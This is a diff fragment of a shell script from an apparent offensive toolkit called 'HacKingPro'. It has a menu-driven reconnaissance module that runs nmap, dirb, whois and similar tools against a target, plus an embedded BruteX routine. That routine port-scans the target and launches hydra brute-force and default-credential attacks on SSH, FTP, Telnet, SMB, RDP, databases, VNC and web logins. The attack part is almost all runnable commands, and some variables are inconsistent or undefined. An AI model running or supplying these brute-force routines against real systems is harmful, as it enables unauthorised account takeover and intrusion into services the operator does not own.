+              echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+              ;;
+            esac
+          fi
+
+          #
+          if [ -d $XHacKingProCaseTargetName ]; then
+            #statements
+            echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}$targetNAME ${BBlue}Case Folder Exists, Continue to it\n"
+            read -p "$Press_ENTER"
+            cd $XHacKingProCaseTargetName
+            # echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
+            mkdir Reconnaissance
+            read -p "$Press_ENTER"
+            cd Reconnaissance
+            read -p "$Press_ENTER"
+          else
+            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
+            read -p "$Press_ENTER"
+            mkdir Case
+            read -p "$Press_ENTER"
+            cd Case
+            read -p "$Press_ENTER"
+            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+            read -p "$Press_ENTER"
+            mkdir $targetNAME
+            read -p "$Press_ENTER"
+            cd $targetNAME
+            read -p "$Press_ENTER"
+            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
+            read -p "$Press_ENTER"
+            # Define /HacKingPro/Case/TargetName/Reconnaissance
+            mkdir "$XHacKingProCaseTargetName"
+            mkdir Reconnaissance
+            read -p "$Press_ENTER"
+            XHacKingProCaseTargetNameRecon="$XHacKingPro/Case/$targetNAME/Reconnaissance/"
+            cd Reconnaissance
+            read -p "$Press_ENTER"
+          fi
+          #  [2] - Reconnaissance & Vulnerability Assessment
+          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo "# [2] - Reconnaissance & Vulnerability Assessment | Date: $(date) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo "> - ### Target Phone: ${targetPhone}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          #
+          echo "---" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          #
+          while true; do
+            cd "$XHacKingProCaseTargetNameRecon"
+            #statements
+            clear
+            # HacKingProLogo1
+            HacKingProTargetStatus=$(echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}└──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+          ")
+
+
+    HacKingProMenuMain=$(echo "${BRed}"
+    echo "$HacKingProTargetStatus""
+
+    ${DGrey}┌──╼ ${BRed}[${DGrey} Vulnerability Assessment Main Menu ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} 00 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} TraceRoute Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Ping Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 03 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nslookup Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 04 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dig Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 05 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} WhoIs Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 06 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dirb Scan ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 07 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nmap Scan ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Weaponization ${BRed}]${BGreen}──╼ ${BGreen}   ")
+            read -p "$HacKingProMenuMain" cmd
+            case $cmd in
+              r0 )
+              #
+              xMenu02_arp=$(arp -an)
+              xMenu02_arp_x=$(
+              echo "\n\t\t${BGreen}### Arp Scan Log Time: $(date)"
+              echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $xMenu02_arp " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.)
+              echo "$xMenu02_arp_x"
+              read -p "$Press_ENTER"
+              ;;
+              r1 )
+              #
+              echo "\n\t\t${BGreen}### TraceRoute Scan Log Time: $(date)"
+              echo "# TraceRoute Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              r2 )
+              #
+              echo "\n\t\t${BGreen}### Ping Scan Log Time: $(date)"
+              echo "# Ping Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              r3 )
+              #
+              echo "\n\t\t${BGreen}### Nslookup Scan Log Time: $(date)"
+              echo "# Nslookup Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              r4 )
+              #
+              echo "\n\t\t${BGreen}### Dig Scan Log Time: $(date)"
+              echo "# Dig Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              r5 )
+              #
+              echo "\n\t\t${BGreen}### WhoIs Scan Log Time: $(date)"
+              echo "# WhoIs Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              r6 )
+              #
+              echo "\n\t\t${BGreen}### Dirb Scan Log Time: $(date)"
+              echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              r7 )
+              #
+              echo "\n\t\t${BGreen}### Nmap Scan Log Time: $(date)"
+              echo "# Nmap Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(nmap -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              read -p "$Press_ENTER"
+              ;;
+              test )
+              clear
+              DoSomething=$(arp -a)
+              PrintSomeThing=$(echo "\n\n$(date)\n\n$DoSomething" )
+              echo "$PrintSomeThing"
+              read -p "$Press_ENTER"
+              ;;
+              ls )
+              ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
+              echo "$ls_lahs"
+              sleep 2
+              ls -lahs
+              sleep 2
+              read -p "$ls_lahs" cmd
+              ;;
+              p|P )
+              HacKingProPlanning
+              ;;
+              x|X|exit|quit|Exit )
+              clear
+              cd "$XHacKingPro"
+              HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+              echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+              break
+              ;;
+            esac
+          done
+        }
+        ReconStart
+      fi
+      ;;
+      03|3 )
+      echo "\n\t\t${BRed}[${LGrey}03${BRed}]${BBlue} - ${DGrey}Web Application HacKing"
+      ;;
+      pass )
+      cd "$xMenu05"
+      Brutex(){
+        cd Brutex
+        # TARGET="$1"
+        # PORT="$2"
+        VER="2.3"
+        LOOT_DIR=./
+        FTP_USER_PASS="wordlists/ftp-default-userpass.txt"
+        FTP_USERS="wordlists/ftp_defuser.lst"
+        FTP_PASS="wordlists/ftp_defpass.lst"
+        SSH_USER_PASS="wordlists/ssh-default-userpass.txt"
+        SSH_USERS="wordlists/ssh_defuser.lst"
+        SSH_PASS="wordlists/ssh_defpass.lst"
+        SMTP_USERS="wordlists/smtp_defuser.lst"
+        SMTP_PASS="wordlists/smtp_defpass.lst"
+        POP_USERS="wordlists/pop_defuser.lst"
+        POP_PASS="wordlists/pop_defpass.lst"
+        TELNET_USER_PASS="wordlists/telnet-default-userpass.txt"
+        TELNET_USERS="wordlists/telnet_defuser.lst"
+        TELNET_PASS="wordlists/telnet_defpass.lst"
+        SQL_USERS="wordlists/sql_defuser.lst"
+        SQL_PASS="wordlists/sql_defpass.lst"
+        MSSQL_USER_PASS="wordlists/mssql-default-userpass.txt"
+        MYSQL_USER_PASS="wordlists/mysql-default-userpass.txt"
+        ORACLE_USER_PASS="wordlists/oracle-default-userpass.txt"
+        POSTGRES_USER_PASS="wordlists/postgres-default-userpass.txt"
+        WINDOWS_USER_LIST="wordlists/windows-users.txt"
+        WINDOWS_USER_PASS="wordlists/windows-default-userpass.txt"
+        USER_FILE="wordlists/simple-users.txt"
+        PASS_FILE="wordlists/password.lst"
+        SNMP_FILE="wordlists/snmp-strings.txt"
+        VNC_FILE="wordlists/vnc-default-passwords.txt"
+        HTTP_LOCATION="/"
+        THREADS="30"
+        COLOR1='\033[91m'
+        COLOR2='\033[92m'
+        COLOR3='\033[92m'
+        RESET='\e[0m'
+
+        # UN-COMMENT TO ENABLE PROXY
+        #export HYDRA_PROXY=socks4://127.0.0.1:9050
+
+        if [ -z $targetIP ]; then
+          Checking_IP_Target
+          break
+        fi
+
+        DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+        echo "$COLOR1 __________                __         ____  ___$Color_Off"
+        echo "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$Color_Off"
+        echo "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $Color_Off"
+        echo "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $Color_Off"
+        echo "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $Color_Off"
+        echo "$COLOR1         \/                         \/      \_/$Color_Off"
+        echo ""
+        echo "$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$Color_Off"
+        echo ""
+
+        echo "$COLOR3################################### Running Port Scan ##############################$Color_Off"
+        if [ -z "$PORT" ]
+        then
+          nmap -T4 -P0 --open $targetIP -p21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,8000,8080,6667 -oX $LOOT_DIR/nmap-${TARGET}.xml
+        else
+          nmap -T4 -P0 --open $targetIP -p $PORT -oX $LOOT_DIR/nmap-${TARGET}.xml
+        fi
+        echo ""
+        echo "$COLOR3################################### Running Brute Force ############################$Color_Off"
+        echo ""
+        port_21=`grep 'portid="21"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_22=`grep 'portid="22"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_23=`grep 'portid="23"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_25=`grep 'portid="25"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_80=`grep 'portid="80"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_110=`grep 'portid="110"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_139=`grep 'portid="139"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_162=`grep 'portid="162"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_389=`grep 'portid="389"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_443=`grep 'portid="443"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_445=`grep 'portid="445"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_512=`grep 'portid="512"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_513=`grep 'portid="513"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_512=`grep 'portid="514"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_993=`grep 'portid="993"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_1521=`grep 'portid="1521"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+
+        if [ -z "$port_21" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 21 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 21 opened... running tests...$Color_Off"
+          hydra -C $FTP_USER_PASS $targetIP ftp -t $THREADS -e ns
+          hydra -L $FTP_USERS -P $FTP_PASS $targetIP ftp -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_22" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 22 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 22 opened... running tests...$Color_Off"
+          hydra -C $SSH_USER_PASS $targetIP ssh -t $THREADS -e ns
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP ssh -t $THREADS -e ns
+          hydra -L $SSH_USERS -P $SSH_PASS $targetIP ssh -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_23" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 23 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 23 opened... running tests...$Color_Off"
+          hydra -C $TELNET_USER_PASS $targetIP telnet -t $THREADS -e ns
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP telnet -t $THREADS -e ns
+          hydra -L $TELNET_USERS -P $TELNET_PASS $targetIP telnet -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_25" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 25 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 25 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP smtp-enum -t $THREADS -e ns
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP smtp -t $THREADS -e ns
+          hydra -L $SMTP_USERS -P $SMTP_PASS $targetIP smtp -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_80" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 80 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 80 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-get
+        fi
+
+        if [ -z "$port_110" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 110 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 110 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP pop3 -t $THREADS -e ns
+          hydra -L $POP_USERS -P $POP_PASS $targetIP pop3 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_139" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 139 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 139 opened... running tests...$Color_Off"
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP smb -S 139 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_162" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 162 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 162 opened... running tests...$Color_Off"
+          hydra -P $SNMP_FILE snmp -S 162 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_389" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 389 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 389 opened... running tests...$Color_Off"
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP ldap2 -S 389 -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP ldap3 -S 389 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_443" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 443 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 443 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP https-get
+        fi
+
+        if [ -z "$port_445" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 445 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 445 opened... running tests...$Color_Off"
+          hydra -C $WINDOWS_USER_PASS $targetIP smb -S 445 -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP smb -S 445 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_512" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 512 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 512 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP rexec -S 512 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_513" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 513 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 513 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP rlogin -S 513 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_514" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 514 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 514 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP rsh -S 514 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_993" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 993 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 993 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP imap -S 993 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_1433" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 1433 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 1433 opened... running tests...$Color_Off"
+          hydra -C $MSSQL_USER_PASS $targetIP mssql -S 1433 -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP mssql -S 1433 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_1521" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 1521 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 1521 opened... running tests...$Color_Off"
+          hydra -C $ORACLE_USER_PASS $targetIP oracle -S 1521 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_3306" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 3306 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 3306 opened... running tests...$Color_Off"
+          hydra -C $MYSQL_USER_PASS $targetIP mysql -t $THREADS -e ns
+          hydra -L $SQL_USERS -P $SQL_PASS $targetIP mysql -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_3389" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 3389 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 3389 opened... running tests...$Color_Off"
+          hydra -C $WINDOWS_USER_PASS $targetIP rdp -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP rdp -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_5432" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 5432 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 5432 opened... running tests...$Color_Off"
+          hydra -C $POSTGRES_USER_PASS $targetIP postgres -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_5900" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 5900 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 5900 opened... running tests...$Color_Off"
+          hydra -P $VNC_FILE $targetIP vnc -S 5900 -t $THREADS -e ns
+          hydra -P $PASS_FILE $targetIP vnc -S 5900 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_5901" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 5901 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 5901 opened... running tests...$Color_Off"
+          hydra -P $VNC_FILE $targetIP vnc -S 5901 -t $THREADS -e ns
+          hydra -P $PASS_FILE $targetIP vnc -S 5901 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_6667" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 6667 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 6667 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP irc -s 6667 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_8000" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 8000 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 8000 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head -s 8000 -f -q -t $THREADS -e ns -m /
+        fi
+
+        if [ -z "$port_8080" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 8080 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 8080 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head
+        fi
+
+        if [ -z "$port_8100" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 8100 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 8100 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head -S 8100 -f -q -t $THREADS -e ns -m /
+        fi
+
+        echo ""
+        echo "$COLOR3################################### Done! ###########################################$Color_Off"
+        cd "$xMenu05 "
+        read -p "$Press_ENTER" readthat
+        break
+      }
+      MainMenu(){
+        while true; do
+        #statements
+        clear
+        # HacKingProLogo1
+        HacKingProTargetStatus=$(echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+      ")
+
+        HacKingProMenuMain=$(echo "${BRed}
